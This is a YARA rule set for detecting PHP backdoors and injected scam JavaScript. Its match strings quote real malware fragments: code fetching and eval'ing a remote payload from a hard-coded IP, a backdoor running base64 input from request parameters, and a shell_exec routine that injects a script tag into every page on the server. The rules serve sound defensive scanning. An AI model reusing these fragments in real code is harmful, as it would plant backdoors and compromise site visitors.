/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-10-28
   Identifier: backdoors
   Reference: https://github.com/Hestat/lw-yara/
   Reference2: https://blog.sucuri.net/2018/10/multiple-ways-to-inject-the-same-tech-support-scam-malware.html
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_10_29_18_backdoors_script2 {
   meta:
      description = "backdoors - file script2"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "6f6ce51207e0a3237cf04fbb0e1b4caa3ea2e78a95bbd1c17e12afa19b3ca2a3"
   strings:
      $s1 = "$c1 = \"http://190.97.167.206/p4.txt\"; $n2 = \"base64_decode\"; $b = \"hjghjerg\"; @file_put _contents($b,\"<?php \".$n2(@file_" ascii
      //$s2 = "tents($c1))); include($b);@unlink($b);@eval($n2(@file_get _contents($c1)));" fullword ascii
   condition:
      ( uint16(0) == 0x6324 and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_10_29_18_backdoors_script3 {
   meta:
      description = "backdoors - file script3"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "c0df9c932cf8d9f4aa097ed4d2990fa1415c1ff061b73c535274e8b75fa85017"
   strings:
      $s1 = "$l1 = '<script src=\"https://hotopponents.site/site.js?wtr=1\" type=\"text/javascript\" async></script>';" fullword ascii
      $s2 = "$a = 'find / -type f -name \"*\" | xargs grep -rl \"<head\"';" fullword ascii
      $s3 = "$t = shell_exec($a);" fullword ascii
      $s4 = "105, 116, 101, 47, 115, 105, 116, 101, 46, 106, 115, 63, 119, 116, 114, 61, 50); s0.parentNode.insertBefore(s1,s0); })();';" fullword ascii
      $s5 = "if (strpos($g, '104, 111, 116, 111, 112, 112, 111, 110, 101, 110') !== false || strpos($g, '0xfcc4') !== false) {" fullword ascii
      $s6 = "$g = file_get_contents($f);" fullword ascii
      $s7 = "$a = 'find / -type f -name \"*jquery*js\" | xargs grep -rl \"var\"';" fullword ascii
      $s8 = "$g = str_replace(\"</head>\",$l1.\"</head>\",$g);" fullword ascii
      $s9 = "$l32 = '(function(){ var s1=document.createElement(\"script\"),s0=document.getElementsByTagName(\"script\")[0]; s1.async=true; s" ascii
      $s10 = "$g = str_replace(\"<head>\",\"<head>\".$l1,$g);" fullword ascii
      $s11 = "if (strpos($g, '104, 111, 116, 111, 112, 112, 111, 110, 101, 110') !== false) {" fullword ascii
      $s12 = "if (strpos($g, 'hotopponents') !== false || strpos($g, '0xfcc4') !== false) {" fullword ascii
      $s13 = "echo \"1e:\".$f;" fullword ascii
      $s14 = "$l32 = '(function(){ var s1=document.createElement(\"script\"),s0=document.getElementsByTagName(\"script\")[0]; s1.async=true; s" ascii
      $s15 = "@file_put_contents($f,$g);" fullword ascii
      $s16 = "echo \"e:\".$f;" fullword ascii
   condition:
      ( uint16(0) == 0x6124 and
         filesize < 4KB and
         ( 8 of them )
      ) or ( all of them )
}

rule infected_10_29_18_backdoors_script1 {
   meta:
      description = "backdoors - file script1"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "032a86ba3060ecaa285e394913e1e1d36289db6cb56bc01c6cc116e5401daab3"
   strings:
      $s1 = "@file_put _contents('cleartemp','<?php '.base64_decode($_REQUEST['q'])); @include('cleartemp'); @unlink('cleartemp');" fullword ascii
   condition:
      ( uint16(0) == 0x6640 and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_10_29_18_backdoors_script4 {
   meta:
      description = "backdoors - file script4"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-10-28"
      hash1 = "6fabfa701da14a21835c61fb7fdbe4db3341528fbedadb696f2bd48c9569d21f"
   strings:
      $s1 = "eyB2YXIgczE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0IiksczA9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoInNjcmlwdCIpWzBdOyBzMS5hc3lu" ascii /* base64 encoded string '{ var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0]; s1.asyn' */
      $s2 = "Yz10cnVlOyBzMS5zcmM9U3RyaW5nLmZyb21DaGFyQ29kZSgxMDQsIDExNiwgMTE2LCAxMTIsIDExNSwgNTgsIDQ3LCA0NywgMTA0LCAxMTEsIDExNiwgMTExLCAxMTIs" ascii /* base64 encoded string 'c=true; s1.src=String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 104, 111, 116, 111, 112,' */
      $s3 = "IDExMiwgMTExLCAxMTAsIDEwMSwgMTEwLCAxMTYsIDExNSwgNDYsIDExNSwgMTA1LCAxMTYsIDEwMSwgNDcsIDExNSwgMTA1LCAxMTYsIDEwMSwgNDYsIDEwNiwgMTE1" ascii /* base64 encoded string ' 112, 111, 110, 101, 110, 116, 115, 46, 115, 105, 116, 101, 47, 115, 105, 116, 101, 46, 106, 115' */
   condition:
      ( uint16(0) == 0x474a and
         filesize < 6KB and
         ( all of them )
      ) or ( all of them )
}

